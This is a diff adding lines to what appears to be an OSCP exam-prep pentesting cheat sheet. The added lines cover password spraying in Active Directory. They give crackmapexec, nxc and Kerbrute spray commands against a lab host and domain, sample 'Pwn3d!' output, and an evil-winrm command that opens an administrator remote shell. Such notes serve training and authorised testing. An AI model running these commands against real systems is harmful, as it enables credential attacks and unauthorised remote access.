@@ -2307,10 +2307,16 @@ gpp-decrypt "cpassword"
 - We can dump hashes on target even without any credentials.
 
 ### Password Spraying
+- Password spray after completing one domain joined machine
 
 ```powershell
 # Crackmapexec - check if the output shows 'Pwned!'
 crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success #use continue-on-success option if it's subnet
+#Caution about using -d domain and --local-auth
+nxc winrm 10.10.117.154 -d oscp.exam -u users.txt -p pass.txt --continue-on-success
+nxc winrm 10.10.117.154 -u users.txt -p pass.txt --continue-on-success --local-auth
+#Getting shell WINRM 10.10.117.154   5985   MS02  [+] MS02\administrator:PASS <b>(Pwn3d!)</b>
+evil-winrm -i 10.10.117.154 -u administrator -p PASS  
 
 # Kerbrute
 kerbrute passwordspray -d corp.com .\usernames.txt "pass"
